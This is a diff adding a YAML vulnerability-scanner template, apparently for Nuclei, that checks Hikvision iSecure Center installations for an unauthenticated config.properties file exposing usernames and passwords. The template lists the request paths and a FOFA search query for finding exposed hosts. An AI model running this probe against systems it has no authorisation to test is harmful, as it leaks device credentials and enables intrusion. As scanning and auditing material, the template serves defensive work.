@@ -1,0 +1,34 @@
+id: hikvision-iSecure-Center-properties-disclosure
+info:
+  name: 海康威视综合安防管理平台 config.properties - 敏感信息泄漏
+  author: leadlife
+  severity: high
+  description: 海康威视-综合安防管理平台 config.properties 文件存在敏感信息泄露漏洞，该漏洞指敏感信息或资源被未授权地披露给攻击者，根据泄露的内容和上下文，可能会引起多种不同类别的安全问题。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="HIKVISION-iSecure-Center" || app="HIKVISION-综合安防管理平台" || icon_hash="-808437027" || title="综合安 防管理平台"
+  tags: hikvision,disclosure,iot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/conf/config.properties"
+      - "{{BaseURL}}/hk/portal/conf/config.properties"
+      - "{{BaseURL}}/hkvision/portal/conf/config.properties"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '@bic'
+          - 'username'
+          - 'password'    
+        condition: and                
+      
+      - type: status
+        status:
+          - 200
